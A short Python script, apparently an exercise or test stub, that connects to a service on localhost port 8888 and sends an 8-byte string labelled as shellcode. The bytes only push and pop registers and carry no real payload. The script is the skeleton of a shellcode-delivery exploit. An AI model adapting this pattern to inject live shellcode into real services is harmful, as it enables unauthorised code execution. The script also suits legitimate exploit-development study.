#!/usr/bin/env python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 8888))

shellcode = "\x56\x57\x51\x52\x5e\x5f\x59\x5a"

print("Sending shellcode (" + str(len(shellcode)) + " bytes)")
s.send(shellcode)
